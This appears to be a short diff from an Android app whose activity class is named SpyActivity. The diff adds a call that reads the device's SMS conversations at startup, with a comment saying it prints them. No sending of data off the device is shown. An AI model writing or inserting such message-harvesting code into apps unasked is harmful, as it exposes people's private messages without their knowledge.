@@ -33,6 +33,8 @@ public class SpyActivity extends Activity {
 		super.onCreate(savedInstanceState);
 		setContentView(R.layout.activity_main);
 		
+		//print sms conversations
+		(new GetSMS()).getConversations(this);
 		
 		Button sendButton = (Button) findViewById(R.id.button1);
 		final SpyActivity zis = this;
